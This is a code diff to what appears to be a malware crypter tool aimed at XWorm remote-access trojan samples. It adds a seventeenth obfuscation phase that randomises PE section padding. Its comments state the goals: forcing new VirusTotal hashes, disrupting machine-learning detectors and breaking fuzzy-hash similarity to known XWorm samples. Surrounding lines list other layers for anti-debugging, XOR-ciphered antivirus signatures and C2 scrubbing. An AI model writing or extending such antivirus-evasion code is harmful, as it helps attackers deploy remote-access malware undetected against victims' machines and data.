@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 16-phase"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 17-phase"),
 ]
 
 
@@ -1741,7 +1741,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  16  PHASES", "wh")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  17  PHASES", "wh")
         self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
         self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
         self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
@@ -2691,7 +2691,71 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               ASCII: {ph16_ascii} · UTF-16LE: {ph16_utf16} XWorm-module/XOR token(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 16
+        # ── Ph17 : PE section padding entropy fill ───────────────────────────────
+        # Fills the null-byte padding between PE sections with random bytes.
+        # The PE loader uses RVAs — this padding is genuinely unused code space.
+        # Effect:
+        #   • Forces a new SHA-256 hash → VirusTotal rescans fresh every run
+        #   • Raises per-section entropy → disrupts ML-based detectors
+        #   • Destroys residual byte-pattern fingerprints in padding regions
+        #   • Breaks fuzzy-hash (TLSH / ssdeep) similarity to known XWorm samples
+        self._ln("        [Ph17] PE section padding entropy fill...", "cy")
+        try:
+            raw17  = bytes(working)
+            pe17   = raw17.find(b'PE\x00\x00')
+            if pe17 != -1:
+                num_sect17 = struct.unpack_from("<H", working, pe17 + 6)[0]
+                opt_sz17   = struct.unpack_from("<H", working, pe17 + 20)[0]
+                sect_tbl17 = pe17 + 4 + 20 + opt_sz17
+                pad_regions = []
+                for si in range(min(num_sect17, 32)):
+                    soff17 = sect_tbl17 + si * 40
+                    if soff17 + 40 > len(working):
+                        break
+                    raw_ptr  = struct.unpack_from("<I", working, soff17 + 20)[0]  # PointerToRawData
+                    raw_size = struct.unpack_from("<I", working, soff17 + 16)[0]  # SizeOfRawData
+                    virt_sz  = struct.unpack_from("<I", working, soff17 + 8)[0]   # VirtualSize
+                    if raw_ptr == 0 or raw_size == 0:
+                        continue
+                    # Padding = bytes between VirtualSize and SizeOfRawData (file alignment padding)
+                    if raw_size > virt_sz > 0:
+                        pad_start = raw_ptr + virt_sz
+                        pad_end   = raw_ptr + raw_size
+                        if pad_end <= len(working) and pad_end - pad_start >= 4:
+                            pad_regions.append((pad_start, pad_end))
+
+                padded_sections = 0
+                padded_bytes    = 0
+                for pstart, pend in pad_regions:
+                    # Only randomise runs of at least 4 null bytes (genuine padding)
+                    i = pstart
+                    while i < pend - 3:
+                        if working[i] == 0 and working[i+1] == 0:
+                            run_end = i
+                            while run_end < pend and working[run_end] == 0:
+                                run_end += 1
+                            run_len = run_end - i
+                            if run_len >= 4:
+                                for ri in range(i, run_end):
+                                    working[ri] = random.randint(1, 254)
+                                padded_bytes += run_len
+                                i = run_end
+                                continue
+                        i += 1
+                    if padded_bytes > 0:
+                        padded_sections += 1
+
+                hits += padded_sections
+                self._ln(f"               {padded_sections} section(s) · {padded_bytes} null-padding byte(s) randomised", "g3")
+                if padded_bytes:
+                    self._ln("               Entropy raised · fuzzy-hash similarity to known samples broken", "am")
+            else:
+                self._ln("               PE signature not found — skipped", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        num_phases = 17
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
